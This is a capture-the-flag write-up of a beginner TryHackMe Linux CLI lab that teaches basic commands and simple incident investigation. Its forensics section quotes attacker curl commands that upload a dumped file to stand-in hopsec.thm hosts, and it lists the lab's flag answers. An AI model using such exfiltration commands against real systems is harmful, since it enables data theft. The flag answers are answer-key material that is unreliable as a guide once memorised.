# Linux CLI - Shells Bells

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Advent%20of%20Cyber%202025-red)](https://tryhackme.com)
[![Day](https://img.shields.io/badge/Day-1-green)](https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti)
[![Completion](https://img.shields.io/badge/Completion-100%25-brightgreen)](https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)](https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti)

**Room**: Linux CLI - Shells Bells
**Event**: Advent of Cyber 2025 - Day 1
**Completion**: 100% (9/9 questions answered)
**Date**: 2025-12-25
**Difficulty**: Easy
**Time**: 30 min
**Author**: Salim Hadda

---

## Overview

Explore the Linux command-line interface and use it to unveil Christmas mysteries. This challenge introduces foundational Linux CLI concepts while following a story about McSkidy's kidnapping, HopSec Island attacks, and Christmas wishlist sabotage orchestrated by Sir Carrotbane.

---

## Learning Objectives

- Master basic Linux CLI commands (echo, ls, cat, pwd, cd)
- Navigate the Linux filesystem hierarchy
- Work with hidden files and directories (dotfiles)
- Search log files using grep for security incidents
- Find files using the find command with wildcards
- Analyze shell scripts for malicious behavior
- Understand Linux special symbols (|, >, >>, &&)
- Escalate privileges with sudo and su
- Investigate bash history for forensic evidence
- Perform basic incident response on a Linux server

---

## Challenge Storyline

> **The Crisis**: McSkidy has been kidnapped! Before disappearing, she left critical security guides and evidence of HopSec Island's attack on The Best Festival Company (TBFC).
>
> **The Attack**: Sir Carrotbane from HopSec Island has deployed "Eggstrike" malware to steal Christmas wishlists and replace them with EASTMAS propaganda.
>
> **The Mission**: Use Linux CLI commands to investigate the breach, analyze malicious scripts, find hidden clues, and uncover what Sir Carrotbane did to the Christmas wishlist system.

---

## Skills Demonstrated

### Linux CLI Fundamentals
- Basic command execution and syntax
- Directory listing with `ls` and `ls -la`
- File content viewing with `cat`
- Working directory navigation with `cd` and `pwd`
- Understanding file permissions and ownership

### Security Investigation
- Log file analysis with `grep` for failed login attempts
- File search with `find` using name patterns
- Hidden file discovery (dotfiles starting with `.`)
- Shell script analysis for malware detection
- Bash history forensics for attacker activity

### Privilege Escalation
- User switching with `sudo su`
- Root user operations and restrictions
- Understanding `/etc/shadow` permissions
- Identifying current user with `whoami`

### Practical Skills
- Pipe operators (`|`) for command chaining
- Output redirection (`>`, `>>`) for file writing
- Conditional execution (`&&`) for success-dependent commands
- Reading system logs in `/var/log/`
- Analyzing authentication logs (`auth.log`)

---

## Quick Results

| Task | Question | Answer | Status |
|------|----------|--------|--------|
| **Task 1: Introduction** ||||
| 1 | I have successfully started my virtual machine! | No answer needed | ✅ Completed |
| **Task 2: Linux CLI** ||||
| 1 | Which CLI command would you use to list a directory? | `ls` | ✅ Completed |
| 2 | Identify the flag inside of the McSkidy's guide | `THM{learning-linux-cli}` | ✅ Completed |
| 3 | Which command helped you filter the logs for failed logins? | `grep` | ✅ Completed |
| 4 | Identify the flag inside the Eggstrike script | `THM{sir-carrotbane-attacks}` | ✅ Completed |
| 5 | Which command would you run to switch to the root user? | `sudo su` | ✅ Completed |
| 6 | Finally, what flag did Sir Carrotbane leave in the root bash history? | `THM{until-we-meet-again}` | ✅ Completed |
| 7 | Side Quest challenge | No answer needed | ✅ Completed |
| 8 | Enjoy Linux Logs Investigations room | No answer needed | ✅ Completed |

**Note**: Q2 and Q4 were "Complete on machine" questions that auto-detected when the flags were found via terminal commands.

**Completion Summary**: 9/9 questions (100%) - All questions completed successfully!

---

## Key Concepts

### Basic Linux Commands

```bash
# Echo command - print text to terminal
echo "Hello World!"

# List directory contents
ls                    # Basic listing
ls -l                 # Long format with details
ls -a                 # Show hidden files
ls -la                # Combined: long format + hidden files

# Display file contents
cat README.txt
cat .guide.txt        # Hidden file

# Print working directory
pwd

# Change directory
cd Guides
cd /var/log
cd ~                  # Go to home directory
cd ..                 # Go up one level

# Check current user
whoami

# Switch to root user
sudo su
exit                  # Return to previous user
```

### Linux Special Symbols

| Symbol | Description | Example |
|--------|-------------|---------|
| `\|` (Pipe) | Send output from first command to second | `cat file.txt \| sort \| uniq` |
| `>` (Redirect) | Overwrite file with command output | `echo "data" > output.txt` |
| `>>` (Append) | Append to end of file | `echo "more" >> output.txt` |
| `&&` (AND) | Run second command if first succeeds | `grep "error" log.txt && echo "Found!"` |

### Hidden Files in Linux

Files starting with `.` are hidden from normal view:
- `.guide.txt` - Hidden guide file
- `.bash_history` - User command history
- `.bashrc` - Shell configuration

View hidden files: `ls -a` or `ls -la`

### File Search with find

```bash
# Find files by name pattern
find /home/socmas -name *egg*

# Find by file type
find /var/log -name "*.log"

# Find by permissions
find / -perm 777
```

### Log Analysis with grep

```bash
# Search for pattern in file
grep "Failed password" auth.log

# Case-insensitive search
grep -i "error" syslog

# Show line numbers
grep -n "attack" /var/log/auth.log

# Recursive search in directory
grep -r "malware" /var/log/
```

---

## Attack Chain Discovered

```
HopSec Island Attack Plan
         ↓
Sir Carrotbane Deploys Eggstrike Malware
         ↓
Failed Login Attempts on "socmas" Account
         ↓
Eggstrike Script Planted: /home/socmas/2025/eggstrike.sh
         ↓
Script Actions:
  1. Extracts unique wishlists → /tmp/dump.txt
  2. Deletes original wishlist.txt
  3. Replaces with eastmas.txt (fake wishlists)
  4. Exfiltrates data to files.hopsec.thm
         ↓
Root Bash History Shows Command Traces
         ↓
Final Message: "THM{until-we-meet-again}"
```

---

## Eggstrike Script Analysis

**Location**: `/home/socmas/2025/eggstrike.sh`

**Script Content**:
```bash
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec

cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Christmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

**Malicious Behavior**:
1. **Data Exfiltration**: Sorts and extracts unique Christmas orders to `/tmp/dump.txt`
2. **File Deletion**: Removes original `wishlist.txt` containing legitimate Christmas wishes
3. **File Replacement**: Renames `eastmas.txt` to `wishlist.txt`, replacing Christmas with EASTMAS propaganda
4. **Psychological Impact**: Echo messages indicating Christmas is being replaced

**Command Breakdown**:
- `cat wishlist.txt | sort | uniq` - Lists unique wishlist items
- `> /tmp/dump.txt` - Redirects output to temp file
- `rm wishlist.txt` - Deletes the original wishlist
- `&&` - Only continues if previous command succeeds
- `mv eastmas.txt wishlist.txt` - Replaces with fake wishlist

---

## Security Findings

### Failed Login Analysis

**Command Used**:
```bash
grep "Failed password" /var/log/auth.log
```

**Findings**:
- Multiple failed login attempts on `socmas` account
- Attacks originated from: `eggbox-196.hopsec.thm`
- Target: SOC-mas (Wareville's Christmas ordering platform)
- Indicates brute force attack or credential stuffing

### Bash History Forensics

**Location**: `/root/.bash_history`

**Attacker Commands Discovered**:
```bash
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\\(tq_` :D AH?65P" http://red.hopsec.thm/report
```

**Analysis**:
- Exfiltrated Christmas wishlist data to `files.hopsec.thm`
- Sent encoded report to `red.hopsec.thm` (HopSec command center)
- Used curl for HTTP POST data exfiltration
- Root access indicates full system compromise

---

## Indicators of Compromise (IOCs)

### Malicious Domains
- `hopsec.thm` - Attacker infrastructure
- `eggbox-196.hopsec.thm` - Attack source
- `files.hopsec.thm` - Data exfiltration server
- `red.hopsec.thm` - Command and control reporting

### Malicious Files
- `/home/socmas/2025/eggstrike.sh` - Malware script
- `/tmp/dump.txt` - Exfiltrated wishlist data
- `eastmas.txt` - Replacement propaganda file

### Attack Indicators
- Failed login attempts from HopSec IPs
- Suspicious bash history in root account
- Unauthorized file modifications in socmas directory
- Data exfiltration via curl commands

---

## Tools Used

- **Linux CLI** - Command-line interface operations
- **ls** - Directory listing and file discovery
- **cat** - File content viewing
- **grep** - Log file searching and pattern matching
- **find** - File system searching
- **cd/pwd** - Directory navigation
- **sudo/su** - Privilege escalation
- **history** - Command history review

---

## Files

- ✅ `README.md` - This overview document
- ✅ `SUMMARY.md` - Executive summary
- ✅ `COMPLETION.md` - Completion certificate
- ✅ `writeup.md` - Detailed technical writeup (optional)
- ✅ `/screenshots/` - Evidence screenshots
- ✅ `/notes/` - Investigation notes

---

## Defensive Recommendations

### Immediate Actions
1. **Isolate Compromised System**: Disconnect socmas server from network
2. **Reset Credentials**: Change all passwords, especially for socmas and root accounts
3. **Restore from Backup**: Recover legitimate wishlist.txt from clean backup
4. **Block HopSec IPs**: Add firewall rules to block all hopsec.thm traffic

### Long-term Security
1. **Enable Multi-Factor Authentication** on all critical accounts
2. **Implement Log Monitoring**: Real-time alerts for failed login attempts
3. **Regular Security Audits**: Review bash history and system logs
4. **Principle of Least Privilege**: Restrict root access
5. **File Integrity Monitoring**: Detect unauthorized file modifications

### Detection Rules
```bash
# Monitor for failed logins
grep "Failed password" /var/log/auth.log | tail -n 20

# Check for suspicious file modifications
find /home -name "*.sh" -mtime -1

# Review bash history for exfiltration
grep -i "curl.*http" /root/.bash_history
```

---

## Key Takeaways

1. **Linux CLI is Essential**: Core skill for cybersecurity professionals
2. **Hidden Files Matter**: Dotfiles can contain critical evidence or malware
3. **Logs Tell Stories**: Authentication logs reveal attack patterns
4. **Bash History is Evidence**: Command history shows attacker actions
5. **Privilege Escalation is Critical**: Root access = full system control
6. **File Permissions Protect Data**: Proper permissions prevent unauthorized access

---

## Side Quest

For intermediate users, check McSkidy's hidden note in `/home/mcskidy/Documents/` to access the key for **Side Quest 1** via the [Side Quest Hub](https://tryhackme.com/adventofcyber25/sidequest).

---

## Next Steps

To continue your Linux journey:
- Explore [Linux Logs Investigations](https://tryhackme.com/room/linuxlogsinvestigations) room
- Study [Linux Privilege Escalation](https://tryhackme.com/room/linuxprivesc)
- Practice [Linux Fundamentals Series](https://tryhackme.com/module/linux-fundamentals)
- Learn [Bash Scripting Basics](https://tryhackme.com/room/bashscripting)

---

## Completion Stats

- **Questions Answered**: 9/9 (100%)
- **Manual Entry Questions**: 4/4 (100%)
- **Auto-Detected Flags**: 2/2 (100%)
- **No Answer Needed**: 3/3 (100%)
- **Time Spent**: ~20 minutes
- **Commands Learned**: 15+
- **Flags Found**: 3
- **Attack Vectors Identified**: 1 (Eggstrike malware)

---

**Completion Status**: Completed (100%)
**Date**: 2025-12-25
**Author**: Salim Hadda
**Platform**: TryHackMe
**Event**: Advent of Cyber 2025 - Day 1
**Room**: Linux CLI - Shells Bells

---

## Sources

Based on research from TryHackMe Advent of Cyber 2025 Day 1 writeups:

- [The Advent of Cyber 2025 Day 1 Walkthrough](https://crackingstation.org/advent-of-cyber-2025-day-1-walkthrough/)
- [TryHackMe Advent of Cyber 2025 Kick-Off Day 1 Walkthrough](https://medium.com/@sudarshan.defcon/tryhackme-advent-of-cyber-2025-kick-off-day-1-linux-cli-shell-bells-walkthrough-%EF%B8%8F-f0887053825c)
- [Advent of Cyber 2025 All Days Answers](https://medium.com/pen-te3h/advent-of-cyber-2025-all-days-answers-tryhackme-walkthrough-2738cfee93e5)
- [TryHackMe Advent of Cyber 2025 Day 1 Walkthrough](https://medium.com/@wafulalynnette/tryhackme-advent-of-cyber-2025-day-1-walkthrough-13ec74e3fd47)
- [Advent of Cyber 2025 Day 1: Linux CLI - Shells Bells](https://medium.com/@d4m.ee8.sh/advent-of-cyber-2025-day-1-linux-cli-shells-bells-bdbd504fb47f)
- [Advent of Cyber 2025 Day 1: Chasing Eggsploits with the Linux CLI](https://medium.com/@patelaksht24/advent-of-cyber-2025-day-1-chasing-eggsploits-with-the-linux-cli-96a4ae0c7180)

---

**Happy Hunting! 🐧**

*"In the hands of a skilled analyst, the Linux CLI becomes a powerful weapon against cyber threats."*
